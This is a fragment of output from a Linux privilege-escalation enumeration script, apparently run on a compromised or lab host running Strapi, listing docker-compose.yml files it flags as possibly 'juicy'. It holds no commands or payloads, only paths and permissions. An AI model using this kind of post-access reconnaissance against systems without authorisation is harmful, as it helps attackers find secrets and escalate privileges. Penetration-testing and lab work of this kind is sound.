drwxr-xr-x 14 root root 4096 May 25  2021 ..


[-] Anything juicy in docker-compose.yml:
-rw-r--r-- 1 root root 477 Nov 19  2020 /usr/lib/node_modules/pm2/node_modules/@pm2/io/docker-compose.yml
-rw-r--r-- 1 root root 886 Oct 26  1985 /usr/lib/node_modules/strapi/node_modules/knex/scripts/stress-test/docker-compose.yml
-rw-rw-r-- 1 strapi strapi 2495 Oct 26  1985 /opt/strapi/myapi/node_modules/strapi-hook-knex/node_modules/knex/scripts/docker-compose.yml
-rw-rw-r-- 1 strapi strapi 886 Oct 26  1985 /opt/strapi/myapi/node_modules/strapi-hook-knex/node_modules/knex/scripts/stress-test/docker-compose.yml
-rw-rw-r-- 1 strapi strapi 886 Oct 26  1985 /opt/strapi/myapi/node_modules/strapi-utils/node_modules/knex/scripts/stress-test/docker-compose.yml
-rw-rw-r-- 1 strapi strapi 3352 Oct 26  1985 /opt/strapi/myapi/node_modules/knex/scripts/docker-compose.yml
-rw-rw-r-- 1 strapi strapi 886 Oct 26  1985 /opt/strapi/myapi/node_modules/knex/scripts/stress-test/docker-compose.yml


### SCAN COMPLETE ####################################
